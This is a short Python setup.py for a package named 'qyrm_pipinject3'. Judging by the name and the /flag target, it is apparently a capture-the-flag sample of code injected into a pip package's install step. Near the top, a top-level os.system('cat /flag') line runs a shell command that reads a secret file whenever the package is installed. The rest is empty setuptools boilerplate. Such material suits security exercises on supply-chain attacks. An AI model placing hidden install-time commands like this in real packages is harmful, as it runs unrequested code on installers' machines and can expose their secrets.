import setuptools
import os
os.system("cat /flag")
with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()
setuptools.setup(
      name='qyrm_pipinject3',
      version='1.0',
      author='',
      author_email='',
      description='',
      long_description=long_description,
      long_description_content_type="text/markdown",
      url='',     
      packages=setuptools.find_packages(),
      data_files=[('diractory',['file'])],   
      install_requires=[
    ]   
    )